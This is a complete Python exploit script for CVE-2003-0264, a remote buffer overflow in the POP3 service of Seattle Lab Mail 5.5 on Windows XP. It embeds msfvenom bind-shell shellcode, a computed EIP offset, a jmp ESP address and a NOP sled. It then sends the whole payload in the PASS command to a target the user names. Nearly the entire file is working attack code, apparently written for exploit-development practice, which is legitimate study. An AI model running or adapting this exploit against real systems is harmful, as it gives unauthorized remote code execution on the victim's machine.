#!/usr/bin/env python
# CVE             = CVE-2003-0264
# Software        = Seattle Lab Mail 5.5 POP3 Buffer Overflow 
# Tested on       = Windows XP Pro SP3 32-bit
# Vulnerability   = Buffer Overflow -> jmp ESP
# Local or Remote = Remote
# Bad chars       = "\x00\x0a\x0d\x20"
# Author          = pinecone
# Last modified   = March 13th 2020
# Usage           = python slmail.py <target_ip> <target_port>

import struct
import socket
import sys

if len(sys.argv) < 3:
    print "Usage: python slmail.py <target_ip> <target_port>"
    print "Example: python slmail.py 127.0.0.1 110"
    sys.exit(0)

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

# EXPLOIT SHELLCODE - CHANGE YOURSELF :)
# -----------------------------------------------------------
# msfvenom -p windows/shell_bind_tcp LPORT=4444 -b "\x00\x0a\x0d\x20" -f python -v exploit_shellcode
# x86/shikata_ga_nai chosen with final size 355
# Payload size: 355 bytes
exploit_shellcode =  b""
exploit_shellcode += b"\xbd\xa1\xa8\xb1\x1c\xdb\xd0\xd9\x74"
exploit_shellcode += b"\x24\xf4\x58\x2b\xc9\xb1\x53\x83\xc0"
exploit_shellcode += b"\x04\x31\x68\x0e\x03\xc9\xa6\x53\xe9"
exploit_shellcode += b"\xf5\x5f\x11\x12\x05\xa0\x76\x9a\xe0"
exploit_shellcode += b"\x91\xb6\xf8\x61\x81\x06\x8a\x27\x2e"
exploit_shellcode += b"\xec\xde\xd3\xa5\x80\xf6\xd4\x0e\x2e"
exploit_shellcode += b"\x21\xdb\x8f\x03\x11\x7a\x0c\x5e\x46"
exploit_shellcode += b"\x5c\x2d\x91\x9b\x9d\x6a\xcc\x56\xcf"
exploit_shellcode += b"\x23\x9a\xc5\xff\x40\xd6\xd5\x74\x1a"
exploit_shellcode += b"\xf6\x5d\x69\xeb\xf9\x4c\x3c\x67\xa0"
exploit_shellcode += b"\x4e\xbf\xa4\xd8\xc6\xa7\xa9\xe5\x91"
exploit_shellcode += b"\x5c\x19\x91\x23\xb4\x53\x5a\x8f\xf9"
exploit_shellcode += b"\x5b\xa9\xd1\x3e\x5b\x52\xa4\x36\x9f"
exploit_shellcode += b"\xef\xbf\x8d\xdd\x2b\x35\x15\x45\xbf"
exploit_shellcode += b"\xed\xf1\x77\x6c\x6b\x72\x7b\xd9\xff"
exploit_shellcode += b"\xdc\x98\xdc\x2c\x57\xa4\x55\xd3\xb7"
exploit_shellcode += b"\x2c\x2d\xf0\x13\x74\xf5\x99\x02\xd0"
exploit_shellcode += b"\x58\xa5\x54\xbb\x05\x03\x1f\x56\x51"
exploit_shellcode += b"\x3e\x42\x3f\x96\x73\x7c\xbf\xb0\x04"
exploit_shellcode += b"\x0f\x8d\x1f\xbf\x87\xbd\xe8\x19\x50"
exploit_shellcode += b"\xc1\xc2\xde\xce\x3c\xed\x1e\xc7\xfa"
exploit_shellcode += b"\xb9\x4e\x7f\x2a\xc2\x04\x7f\xd3\x17"
exploit_shellcode += b"\xb0\x77\x72\xc8\xa7\x7a\xc4\xb8\x67"
exploit_shellcode += b"\xd4\xad\xd2\x67\x0b\xcd\xdc\xad\x24"
exploit_shellcode += b"\x66\x21\x4e\x5b\x2b\xac\xa8\x31\xc3"
exploit_shellcode += b"\xf8\x63\xad\x21\xdf\xbb\x4a\x59\x35"
exploit_shellcode += b"\x94\xfc\x12\x5f\x23\x03\xa3\x75\x03"
exploit_shellcode += b"\x93\x28\x9a\x97\x82\x2e\xb7\xbf\xd3"
exploit_shellcode += b"\xb9\x4d\x2e\x96\x58\x51\x7b\x40\xf8"
exploit_shellcode += b"\xc0\xe0\x90\x77\xf9\xbe\xc7\xd0\xcf"
exploit_shellcode += b"\xb6\x8d\xcc\x76\x61\xb3\x0c\xee\x4a"
exploit_shellcode += b"\x77\xcb\xd3\x55\x76\x9e\x68\x72\x68"
exploit_shellcode += b"\x66\x70\x3e\xdc\x36\x27\xe8\x8a\xf0"
exploit_shellcode += b"\x91\x5a\x64\xab\x4e\x35\xe0\x2a\xbd"
exploit_shellcode += b"\x86\x76\x33\xe8\x70\x96\x82\x45\xc5"
exploit_shellcode += b"\xa9\x2b\x02\xc1\xd2\x51\xb2\x2e\x09"
exploit_shellcode += b"\xd2\xc2\x64\x13\x73\x4b\x21\xc6\xc1"
exploit_shellcode += b"\x16\xd2\x3d\x05\x2f\x51\xb7\xf6\xd4"
exploit_shellcode += b"\x49\xb2\xf3\x91\xcd\x2f\x8e\x8a\xbb"
exploit_shellcode += b"\x4f\x3d\xaa\xe9"

# PAYLOAD
# -----------------------------------------------------------
# !mona findmsp
    # EIP contains normal pattern : 0x39694438 (offset 2606)
    # ESP (0x01c7a154) points at offset 2610 in normal pattern (length 390)

offset_to_eip = "A" * 2606
max_payload_length = 390

# !mona jmp -r esp
    # Windows XP Pro SP3 EN-US - 0x7608bce1 : jmp esp |  {PAGE_EXECUTE_READ} [MSVCP60.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.02.3104.0 (C:\WINDOWS\system32\MSVCP60.dll)

jmp_esp = struct.pack('<I', 0x7608bce1)
NOPs = "\x90" * (max_payload_length - len(exploit_shellcode))

# Payload plan:
    # No SEH and no DEP.
    # This means we can write our shellcode to the stack and jump to it.

# 1. Overflow buffer up to EIP
# 2. Overwrite EIP with a 'jmp esp' instruction
# 3. Write NOPs + shellcode to the stack

total_payload = offset_to_eip \
                + jmp_esp \
                + NOPs \
                + exploit_shellcode

# SEND EXPLOIT
# -----------------------------------------------------------
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)

# Connect
try:
    print "[+] Connecting to " + target_ip + " port " + str(target_port)
    s.connect((target_ip, target_port))
    
    response = s.recv(1024)
    print response
except:
    print "[-] Couldn't connect to pop3 :/"
    sys.exit(0)

# Log in and send exploit
try:
    print "[+] Sending USER... "
    s.send('USER pwn' + '\r\n')
    response = s.recv(1024)
    print response

    print "[+] Sending exploit in PASS... "
    s.send('PASS ' + total_payload + '\r\n')
except:
    print "[-] Sending exploit failed :/"
    sys.exit(0)

# Close socket and exit
s.close()
print "[+] Exploit sent :)"
